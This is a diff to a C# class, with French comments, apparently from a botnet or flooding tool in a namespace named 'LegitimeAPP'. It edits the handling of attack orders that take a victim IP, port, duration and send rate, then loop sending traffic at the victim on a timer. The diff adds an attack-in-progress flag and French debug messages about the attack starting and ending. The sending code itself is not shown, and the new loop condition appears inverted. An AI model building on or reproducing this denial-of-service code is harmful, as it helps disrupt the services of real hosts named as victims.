@@ -35,6 +35,8 @@ namespace LegitimeAPP.Shared
         [XmlElement("speed")]
         public int speed;
 
+        private Boolean _attackInProgress ; 
+
         [XmlIgnore]
         Thread executingThis;
 
@@ -49,25 +51,31 @@ namespace LegitimeAPP.Shared
 
 
         public void OnNewAttackOrder() {
+            _attackInProgress = true ; 
             NewAttackOrder?.Invoke();
         } 
         public void OnEndAttackOrder() {
+            _attackInProgress = false ; 
             EndAttackOrder?.Invoke();
         }
 
 
 
         // Pour la serialization
-        public Order() { }
+        public Order() {
+            _attackInProgress = false ; 
+         }
 
         // Constructeur pour indiquer un état 
         public Order(TypeAction action) {
+            _attackInProgress = false ; 
             this.action = action ;
         }
 
         // Constructeur pour ordonner une attaque 
         public Order(int Port, string VictimIP, int nbSecond, int speed = 250, TypeAction action = TypeAction.ATTACK)
         {
+            _attackInProgress = false ; 
             this.action = TypeAction.ATTACK ; 
             this.Port = Port;
             this.VictimIP = VictimIP;
@@ -94,28 +102,30 @@ namespace LegitimeAPP.Shared
 
                 OnNewAttackOrder();
 
+
+                Console.WriteLine("CE QUE JE VEUX : " + (_attackInProgress ? "EST TRUE" : "EST FALSE") )  ;
+
             Timer = new System.Timers.Timer(nbSecond * 1000)
             {
                 AutoReset = false,
                 Enabled = true, 
             };
 
-            Console.WriteLine("The application started at {0:HH:mm:ss.fff}", DateTime.Now);
+            Console.WriteLine("Le début de l'attaque a été déclencher  {0:HH:mm:ss.fff}", DateTime.Now);
 
 
             Timer.Elapsed += delegate
                 {
 
-                    if (executingThis != null && executingThis.IsAlive)
-                    {
+            
 
-                        Console.WriteLine("The Elapsed event was raised at {0:HH:mm:ss.fff}",
+                        Console.WriteLine("La fin de l'attaque a été déclenché a {0:HH:mm:ss.fff}",
                           DateTime.Now);
                         OnEndAttackOrder();
-                       // WriteNetMessage(Data<Order>.DataToXml(new Order(TypeAction.WAIT))) ; 
-                        Timer.Dispose() ; 
+                        Timer.Dispose() ;
+                       
                         executingThis = new Thread(Exec);
-                    }
+                    
                 };
 
                 // Démarrage du timer et de l'attaque
@@ -123,6 +133,7 @@ namespace LegitimeAPP.Shared
                 executingThis.Start();
            
         }
+        
 
 
 
@@ -168,7 +179,7 @@ namespace LegitimeAPP.Shared
             IPEndPoint ep = new(IPAddress.Parse(this.VictimIP), this.Port);
 
 
-            while (true)
+            while (!_attackInProgress)
             {
 
                 // Console.WriteLine("On attaque ! ") ; 
@@ -178,6 +189,8 @@ namespace LegitimeAPP.Shared
                 // attente avant chaque envoie 
                 Thread.Sleep(this.speed);
             }
-        }
+
+            Console.WriteLine("On passe par là ") ; 
+         }
     }
 }
